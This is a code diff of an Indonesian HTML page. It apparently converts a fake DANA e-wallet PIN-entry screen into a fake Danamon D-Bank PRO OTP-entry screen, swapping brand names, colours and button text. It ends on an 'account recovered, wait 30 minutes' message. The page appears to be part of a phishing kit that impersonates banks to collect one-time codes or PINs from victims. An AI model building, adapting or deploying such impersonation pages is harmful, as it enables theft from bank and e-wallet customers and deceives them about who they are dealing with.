@@ -3,21 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DANA - Masukkan PIN</title>
+    <title>DANAMON - Masukkan OTP</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         body {
             font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             background-color: #ffffff;
         }
-        .dana-blue {
-            background-color: #108EE9;
+        .dana-orange {
+            background-color: #FF9800;
         }
-        .dana-blue-bg {
-            background-color: #108EE9;
+        .dana-orange-bg {
+            background-color: #FF9800;
         }
-        .dana-blue-text {
-            color: #108EE9;
+        .dana-orange-text {
+            color: #FF9800;
         }
         /* Style untuk bulatan PIN */
         .pin-dot {
@@ -28,7 +28,7 @@
             transition: background-color 0.2s;
         }
         .pin-dot.active {
-            background-color: #108EE9;
+            background-color: #FF9800;
         }
         /* Animasi loading */
         @keyframes spin {
@@ -41,7 +41,7 @@
 </head>
 <body class="flex flex-col min-h-screen">
 
-    <header class="dana-blue p-4 flex items-center">
+    <header class="dana-orange p-4 flex items-center">
         <button class="text-white p-2" onclick="goBack()">
             <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                 <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M15 19l-7-7 7-7" />
@@ -53,7 +53,7 @@
     </header>
 
     <main class="flex flex-col items-center pt-16 px-6">
-        <h2 class="text-2xl font-semibold text-gray-900 mb-12">Masukkan PIN</h2>
+        <h2 class="text-2xl font-semibold text-gray-900 mb-12">Masukkan OTP</h2>
 
         <!-- Indikator PIN -->
         <div id="pinDots" class="flex space-x-6 mb-16">
@@ -65,8 +65,8 @@
             <div class="pin-dot"></div>
         </div>
 
-        <button class="dana-blue-text font-bold text-sm tracking-wide uppercase">
-            Lupa PIN?
+        <button class="dana-orange-text font-bold text-sm tracking-wide uppercase">
+            KIRIM ULANG OTP?
         </button>
 
         <!-- Input PIN tersembunyi -->
@@ -87,12 +87,12 @@
             </div>
             
             <h2 class="text-3xl font-bold text-gray-900 mb-4">Berhasil!</h2>
-            <p class="text-xl text-gray-600 text-center mb-12">Akun DANA kamu berhasil dipulihkan</p>
+            <p class="text-xl text-gray-600 text-center mb-12">Akun D-Bank PRO Danamon berhasil di pulihkan</p>
             
             <!-- Informasi akun -->
             <div class="bg-gray-50 rounded-xl p-6 w-full max-w-md mb-8">
                 <div class="flex items-center space-x-4">
-                    <div class="w-12 h-12 bg-[#108EE9] rounded-full flex items-center justify-center text-white font-bold text-xl">
+                    <div class="w-12 h-12 bg-[#FF9800] rounded-full flex items-center justify-center text-white font-bold text-xl">
                         D
                     </div>
                     <div>
@@ -102,16 +102,16 @@
                 </div>
                 <div class="border-t border-gray-200 mt-4 pt-4">
                     <p class="text-gray-500 text-sm">Sukses</p>
-                    <p class="text-gray-900 font-bold text-2xl">Tunggu 30 menit</1000000></p>
+                    <p class="text-gray-900 font-bold text-2xl">Tunggu 30 menit</p>
                 </div>
             </div>
         </div>
         
         <div class="w-full max-w-md">
-            <button onclick="goToDashboard()" class="w-full dana-blue-bg text-white font-bold py-4 rounded-xl text-lg tracking-wide shadow-lg hover:bg-blue-600 transition duration-300">
-                MASUK KE DANA
+            <button onclick="goToDashboard()" class="w-full dana-orange-bg text-white font-bold py-4 rounded-xl text-lg tracking-wide shadow-lg hover:bg-orange-600 transition duration-300">
+                MASUK AKUN DANAMON 
             </button>
-            <p class="text-center text-gray-400 text-sm mt-4">Terima kasih telah menggunakan DANA</p>
+            <p class="text-center text-gray-400 text-sm mt-4">Terima kasih telah menggunakan D-Bank Pro</p>
         </div>
     </div>
 
